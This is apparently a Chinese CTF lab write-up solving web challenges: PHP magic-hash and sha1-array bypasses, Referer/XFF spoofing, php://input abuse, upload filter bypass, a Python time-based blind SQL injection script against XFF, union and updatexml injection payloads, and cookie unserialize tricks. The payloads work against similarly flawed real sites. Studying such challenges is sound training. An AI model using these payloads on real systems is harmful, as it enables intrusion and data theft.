<p><code>preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
<p>重点在这句话上，考点为正则表达式</p>
<blockquote>
<p><strong>定界符：</strong>/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
<p><strong>. （一个点）：</strong>表示可以匹配任何字符；</p>
<p><strong>*  ：</strong>前面的字符重复零次或多次；</p>
<p><strong>{n,m} ：</strong>前面的字符重复4~7次；</p>
<p><strong>\ （反斜线）：</strong>后面的字符被转义；</p>
<p><strong>[a-z] ：</strong>在a到z中匹配 ；</p>
<p><strong>[[:punct:]] ：</strong>匹配任何标点符号；</p>
<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感；</p>
</blockquote>
<p>因此可以写出符合要求的字符穿</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">keyakey22222key:</span><span class="hljs-meta-keyword">/a/</span>aaakeyb!</code></pre></div>

<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示 are you from google?</p>
<p>你是从google来的吗</p>
<p>考察http头中的referer参数</p>
<p><strong>Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br>例如：Referer：<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></strong> </p>
<p>那么就抓包修改referer这个参数</p>
<p><code>Referer: https://www.google.com/</code>,直接go即可</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>源码</p>
<div class="hljs"><pre><code class="hljs php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
$a = @$_GET[<span class="hljs-string">'a'</span>];
$md52 = @md5($a);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
&#125;&#125;
<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</code></pre></div>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<div class="hljs"><pre><code class="hljs stylus">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaroZmOk'</span>)</span></span>  
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaK1STfY'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaO8zKZF'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aa3OFF9m'</span>)</span></span></code></pre></div>



<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>见到题目就想到了<code>x-forwarded-for</code>，本地地址可以使用IP:127.0.0.1</p>
<p>可以使用google浏览器的插件<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" srcset="/img/loading.gif" alt></p>
<p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" srcset="/img/loading.gif" alt></p>
<p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" srcset="/img/loading.gif" alt></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-string">'flag.php'</span>);
$_GET[<span class="hljs-string">'id'</span>] = urldecode($_GET[<span class="hljs-string">'id'</span>]);
$flag = <span class="hljs-string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'uname'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;
    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'uname'</span>] == $_POST[<span class="hljs-string">'passwd'</span>])

        <span class="hljs-keyword">print</span> <span class="hljs-string">'passwd can not be uname.'</span>;

    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'uname'</span>]) === sha1($_POST[<span class="hljs-string">'passwd'</span>])&amp;($_GET[<span class="hljs-string">'id'</span>]==<span class="hljs-string">'margin'</span>))

        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);

    <span class="hljs-keyword">else</span>

        <span class="hljs-keyword">print</span> <span class="hljs-string">'sorry!'</span>;

&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>首先看一下要传入哪些变量</p>
<p>get:id uname</p>
<p>post:passwd</p>
<p>id需要进行一次urldecode，解码的值为margin</p>
<p>uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs angelscript">urlencode(margin)=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E
uname[]=<span class="hljs-number">1</span>
passwd[]=<span class="hljs-number">2</span>

GET: id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span>
POST:passwd[]=<span class="hljs-number">2</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif" alt></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
extract($_GET);
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($ac))
&#123;
$f = trim(file_get_contents($fn));
<span class="hljs-keyword">if</span> ($ac === $f)
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;This is flag:"</span> .<span class="hljs-string">" $flag&lt;/p&gt;"</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><strong>extract</strong>函数作用</p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>extract — 从数组中将变量导入到当前的符号表</p>
<p>说明</p>
<p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p>
<p>本函数用来将变量从数组中导入到当前的符号表中。</p>
<p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
<p><strong>trim</strong></p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>说明</p>
<p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = “ \t\n\r\0\x0B” ] ) : string</p>
<p>此函数返回字符串 <code>str</code> 去除首尾空白字符后的结果。如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p>
<ul>
<li>“ “ (ASCII <code>32</code> (<code>0x20</code>))，普通空格符。</li>
<li>“\t” (ASCII <code>9</code> (<code>0x09</code>))，制表符。</li>
<li>“\n” (ASCII <code>10</code> (<code>0x0A</code>))，换行符。</li>
<li>“\r” (ASCII <code>13</code> (<code>0x0D</code>))，回车符。</li>
<li>“\0” (ASCII <code>0</code> (<code>0x00</code>))，空字节符。</li>
<li>“\x0B” (ASCII <code>11</code> (<code>0x0B</code>))，垂直制表符。</li>
</ul>
<p><strong>file_get_contents</strong></p>
<p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p>
<p>file_get_contents — 将整个文件读入一个字符串</p>
<p>代码的大致含义就是</p>
<p>get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag</p>
<p>这里需要利用php的伪协议写入内容 php://input</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> ac=<span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span>
<span class="hljs-symbol">POST:</span> <span class="hljs-number">111</span></code></pre></div>



<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>题目网站崩了</p>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>文件上传</p>
<p>首先先上传一个图片文件，上传成功了并返回保存路径</p>
<p>再上传一个php的文件，提示<code>Invalid file</code></p>
<p>上传.htaccess, .user.ini都提示<code>you got it</code></p>
<p>两种提示不一样猜测可能存在后缀黑名单和文件类型检测。</p>
<p>上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file </p>
<p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" srcset="/img/loading.gif" alt="getshell1.png"></p>
<p>再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag</p>
<p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" srcset="/img/loading.gif" alt="getshell2.png"></p>
<p>考察知识点：</p>
<p><strong>请求中的Content-Type</strong></p>
<p>在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。</p>
<p><strong>设置请求头中的Content-Type</strong></p>
<p>当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。</p>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>提示了insert into注入</p>
<p>并给出了源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span><span class="hljs-params">()</span></span>&#123;
$ip = <span class="hljs-string">''</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>]))&#123; <span class="hljs-comment">//判断是否存在xxf</span>
$ip = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];		<span class="hljs-comment">//存在则优先使用xxf</span>
&#125;<span class="hljs-keyword">else</span>&#123;
$ip = $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>];				<span class="hljs-comment">//remote_addr	</span>
&#125;
$ip_arr = explode(<span class="hljs-string">','</span>, $ip);				<span class="hljs-comment">//过滤 ,</span>
<span class="hljs-keyword">return</span> $ip_arr[<span class="hljs-number">0</span>];

&#125;

$host=<span class="hljs-string">"localhost"</span>;
$user=<span class="hljs-string">""</span>;
$pass=<span class="hljs-string">""</span>;
$db=<span class="hljs-string">""</span>;

$connect = mysql_connect($host, $user, $pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to connect"</span>);<span class="hljs-comment">//连接数据库</span>

mysql_select_db($db) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to select database"</span>);

$ip = getIp();
<span class="hljs-keyword">echo</span> <span class="hljs-string">'your ip is :'</span>.$ip;
$sql=<span class="hljs-string">"insert into client_ip (ip) values ('$ip')"</span>; <span class="hljs-comment">//注入点</span>
mysql_query($sql);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。</p>
<p>抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注</p>
<div class="hljs"><pre><code class="hljs arcade"><span class="hljs-symbol">$ip</span>_arr = explode(<span class="hljs-string">','</span>, <span class="hljs-symbol">$ip</span>);   <span class="hljs-comment">//过滤了,</span></code></pre></div>

<p>代替if的注入语句如下</p>
<div class="hljs"><pre><code class="hljs angelscript">select <span class="hljs-keyword">case</span> when 语句<span class="hljs-number">1</span> then 语句<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> 语句<span class="hljs-number">3</span> end;
<span class="hljs-comment">//含义很好理解，就是当语句1为真时，执行语句2，否则执行语句3</span></code></pre></div>

<p>所以要构造的注入语句为</p>
<div class="hljs"><pre><code class="hljs sql">11'+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
//当数据库名的长度为<span class="hljs-number">5</span>时，则执行<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确</code></pre></div>

<p>带入原语句</p>
<div class="hljs"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">'$ip'</span>)
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">'11'</span>+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
//可以看到语句成功注入到原查询语句中，并可以正常执行</code></pre></div>

<p>判断字段每一个字符的值</p>
<p>常用的语句应该为</p>
<div class="hljs"><pre><code class="hljs sql">1' and (case when (substr(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">'c'</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-comment">#</span></code></pre></div>

<p>但是因为逗号被过滤了，所以改为下面的语句</p>
<div class="hljs"><pre><code class="hljs sql">1' and (case when (substr(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">'c'</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-comment">#</span></code></pre></div>



<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> sys
<span class="hljs-comment">#sql = '127.0.0.1'+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+</span>

<span class="hljs-comment">##client_ip,flag</span>

<span class="hljs-comment">#sql = '127.0.0.1'+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name='flag' from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+</span>

sql = <span class="hljs-string">"127.0.0.1'+(select case when substr((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;' then sleep(5) else 0 end))-- +"</span>
url = <span class="hljs-string">'http://123.206.87.240:8002/web15/'</span>
flag = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
    print(str(i))
    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):
        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:
            sys.exit(<span class="hljs-number">0</span>)
        sqli = sql.format(i, chr(ch))
        header = &#123;
            <span class="hljs-string">'X-Forwarded-For'</span>: sqli
        &#125;
        <span class="hljs-keyword">try</span>:
            html = requests.get(url, headers=header, timeout=<span class="hljs-number">3</span>) <span class="hljs-comment">#响应时间超过3秒则 进入except 即可猜测是正确的</span>
        <span class="hljs-keyword">except</span>:
            flag += chr(ch)
            print(flag)
            <span class="hljs-keyword">break</span></code></pre></div>



<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>网址打不开</p>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>tips</p>
<blockquote>
<p>本题有2个flag<br>flag均为小写<br>flag格式 flag{}</p>
</blockquote>
<p>看到题目提示，应该是二次注入</p>
<p>url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 <code>There is nothing</code></p>
<p>输入 id=1’or 1=1–+ 报错</p>
<p>但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。</p>
<div class="hljs"><pre><code class="hljs matlab"><span class="hljs-number">1</span>'^(<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)!=<span class="hljs-number">0</span>)--+
页面显示错误正常说明<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)!=<span class="hljs-number">0</span>是错的，即<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)=<span class="hljs-number">0</span>，说明union替换为空了
其他关键词的测试也类似</code></pre></div>

<p>开始注入</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-string">' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span>
<span class="hljs-string"></span>
<span class="hljs-string">database:flag1,hint</span>
<span class="hljs-string"></span>
<span class="hljs-string">-1'</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> infoorrmation_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'flag1'</span><span class="hljs-comment">--+</span>
<span class="hljs-keyword">table</span>:flag1,address
<span class="hljs-number">-1</span><span class="hljs-string">' ununionion seselectlect 1,group_concat(flag1) from flag1 --+</span>
<span class="hljs-string">usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入</span>
<span class="hljs-string">-1'</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(address) <span class="hljs-keyword">from</span> flag1 <span class="hljs-comment">--+</span>
拿到下一关的地址</code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/uMT6Q7oaNHJEcbv.png" srcset="/img/loading.gif" alt="sqls-1.png"></p>
<p>同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入</p>
<p><img src="https://i.loli.net/2020/11/23/KBepFMZsYRPHaW8.png" srcset="/img/loading.gif" alt="sqls-2.png"></p>
<p>报错注入一般是固定的模板</p>
<p>下面使用updatexml()进行注入</p>
<blockquote>
<p>函数语法：updatexml(XML_document, XPath_string, new_value);</p>
<p>适用版本: 5.1.5+<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<p>我们通常在第二个xpath参数填写我们要查询的内容。</p>
</blockquote>
<p>payload</p>
<div class="hljs"><pre><code class="hljs sql">1' and updatexml(1,concat('~',(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-string">'~'</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span>
<span class="hljs-keyword">database</span>:~<span class="hljs-keyword">class</span>,flag2~
 
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">' and updatexml(1,concat('</span>~<span class="hljs-string">',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>flag2<span class="hljs-string">'),'</span>~<span class="hljs-string">'),3) %23</span>
<span class="hljs-string">table:~flag2,address~</span>
<span class="hljs-string"># 查数据</span>
<span class="hljs-string">?id=1'</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">'0x7e'</span>,(<span class="hljs-keyword">select</span> flag2 <span class="hljs-keyword">from</span> flag2),<span class="hljs-string">'0x7e'</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span>
 拿到真正的flag</code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" srcset="/img/loading.gif" alt="sqls-flag.png"></p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可</p>
<p>加密后的数据为</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span><span class="hljs-params">($data,$key)</span></span>
<span class="hljs-function"></span>&#123;
    $key = md5(<span class="hljs-string">'ISCC'</span>);
    $x = <span class="hljs-number">0</span>;
    $len = strlen($data);
    $klen = strlen($key);
    <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $len; $i++) &#123; 
        <span class="hljs-keyword">if</span> ($x == $klen)
        &#123;
            $x = <span class="hljs-number">0</span>;
        &#125;
        $char .= $key[$x];
        $x+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $len; $i++) &#123;
        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="hljs-number">128</span>);
    &#125;
    <span class="hljs-keyword">return</span> base64_encode($str);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>解密脚本如下</p>
<div class="hljs"><pre><code class="hljs php">

<span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($str)</span></span>
<span class="hljs-function"></span>&#123;
    $key = md5(<span class="hljs-string">'ISCC'</span>);  <span class="hljs-comment">// 对密钥进行md5加密</span>
    $x=<span class="hljs-number">0</span>;
    $str=base64_decode($str); <span class="hljs-comment">//对加密后的字符串base64解码</span>
    $len=strlen($str);     
    $klen=strlen($key);

    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len;$i++)   <span class="hljs-comment">//计算出char字符数组，用于最后的减操作</span>
    &#123;
        <span class="hljs-keyword">if</span>($x==$klen)
        &#123;
            $x=<span class="hljs-number">0</span>;
        &#125;
        $char.=$key[$x];
        $x+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len;$i++)
    &#123;
        $data.=chr((ord($str[$i])-ord($char[$i])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//加上128为了防止出现负数。</span>
    &#125;
    <span class="hljs-keyword">return</span> $data;
&#125;
<span class="hljs-keyword">echo</span>(decode(<span class="hljs-string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>));
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/DEs3N8y7ngdKovb.png" srcset="/img/loading.gif" alt="encode.png"></p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>网址打不开</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;?php
error_reporting(0);
include_once(&quot;flag.php&quot;);
$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;含cookie 可能需要抓包修改cookie
if(isset($_GET[&#39;hint&#39;]))&#123;
    show_source(__FILE__);
&#125;
elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag
&#123;                                           
    echo &quot;$flag&quot;;
&#125;
else &#123;
?&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;
&lt;title&gt;Login&lt;&#x2F;title&gt;
&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;br&gt;
&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;
  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;
    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;
  &lt;&#x2F;form&gt;
&lt;&#x2F;div&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;

&lt;?php
&#125;
$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;
?&gt;</code></pre></div>

<p>代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了</p>
<p>直接构造</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">21</span>:<span class="hljs-string">"ISecer:www.isecer.com"</span><span class="hljs-comment">;</span></code></pre></div>

<p>但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL</p>
<p>所以真正的payload：</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">0</span>:<span class="hljs-string">""</span><span class="hljs-comment">;</span></code></pre></div>

<p>请求头</p>
<div class="hljs"><pre><code class="hljs groovy">GET <span class="hljs-regexp">/flagphp/</span> HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-string">Host:</span> <span class="hljs-number">123.206</span><span class="hljs-number">.87</span><span class="hljs-number">.240</span>:<span class="hljs-number">8002</span>
User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46.0</span>
<span class="hljs-string">Accept:</span> text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,*/</span>*;q=<span class="hljs-number">0.8</span>
